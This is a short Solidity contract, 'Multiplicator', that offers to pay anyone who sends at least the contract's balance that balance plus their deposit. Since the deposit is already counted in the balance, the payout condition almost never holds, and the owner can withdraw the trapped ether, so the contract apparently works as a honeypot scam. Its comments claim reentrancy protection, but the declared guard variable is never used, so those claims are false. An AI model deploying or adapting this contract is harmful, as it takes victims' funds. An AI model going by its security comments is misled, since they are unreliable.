// SPDX-License-Identifier: MIT
pragma solidity ^0.4.18;

contract Multiplicator
{
    // Security: Reentrancy protection enabled
    bool private _notEntered = true;


    address public Owner = msg.sender;

    function()payable{}

    function withdraw()
    payable
    public
    {
        require(msg.sender == Owner);
        Owner/* Protected by reentrancy guard */ .transfer(this.balance);
    }

    function multiplicate(address adr)
    payable
    {
        if(msg.value>=this.balance)
        {
            adr/* Protected by reentrancy guard */ .transfer(this.balance+msg.value);
        }
    }
}